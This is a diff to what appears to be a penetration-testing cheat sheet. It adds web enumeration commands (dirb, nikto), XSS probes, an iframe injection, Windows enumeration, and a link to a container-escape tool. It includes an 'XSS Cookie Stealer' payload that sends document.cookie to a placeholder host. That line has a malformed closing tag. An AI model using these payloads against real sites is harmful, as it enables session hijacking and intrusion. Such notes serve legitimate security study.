@@ -305,7 +305,28 @@ wpscan --update
 wpscan --url <TARGET-URL>
 ```
 
+## Webapplication Enumeration
+- check source code for any comments and interesting scripts
+- check robots.txt
+- check sitemaps (/sitemap.xml)
+- check admin consoles
 
+### dirb
+```bash
+dirb <URL> -z 10
+```
+
+### dirbuster
+Similar to dirb but with GUI
+
+### ffuf - fuzz faster u fool
+TODO: insert command
+
+
+### Webapplication Vulnerability Scan / nikto
+```bash
+nikto -host=<URL>
+```
 
 # File Transfer and File Downloads
 
@@ -387,6 +408,22 @@ python3 -m http.server 8080
 ```
 # Exploiting
 
+## Cross-Site-Scripting (XSS)
+```javascript
+<script>alert('Happy Hacking')</script>
+```
+
+### Content Injection
+```html
+<iframe src=<URL> height="0" width="0"></iframe>
+```
+
+### XSS Cookie Stealer
+```javascript
+<script>new Image().src="http://x.x.x.x/stealer.jpg?output="+document.cookie;<script>
+```
+
+
 ## SQL Injections
 
 ### Detect number of columns for UNION attack:
@@ -456,13 +493,18 @@ find / -perm -2 ! -type l -ls 2>/dev/null
 
 ## Local Windows Enumeration
 
+### hosts file
+```cmd
+type c:\windows\system32\drivers\etc\hosts
+```
+
 ### Open Ports local
 ```cmd
 netstat -an
 ```
 
 ### Check permission of executable
-```bash
+```cmd
 icacls <filename>
 ```
 
@@ -696,11 +738,15 @@ powershell.exe -ExecutionPolicy Bypass -NoLogo -NonInteractive -NoProfile -File 
 rdesktop -u <User> -p <Password> <Target-IP>
 ```
 
+# Docker Escape
+If you are root in a container, try to use the following tool:
+[https://github.com/PercussiveElbow/docker-escape-tool](https://github.com/PercussiveElbow/docker-escape-tool)
+
 # Stuff you also may need
 
 ## Wireshark
 ### Display Filters
-```
+``` 
 tcp.port == <PORT>
 ```
 
@@ -738,3 +784,7 @@ Attacking Weak RSA Keys:
 ```bash
 python3 RsaCtfTool.py --publickey <PUBLIC KEY> --uncipherfile <CIPHERED FILE>
 ```
+
+## Firefox Plugins you may need
+- Foxy Proxy
+- Cookie-Editor
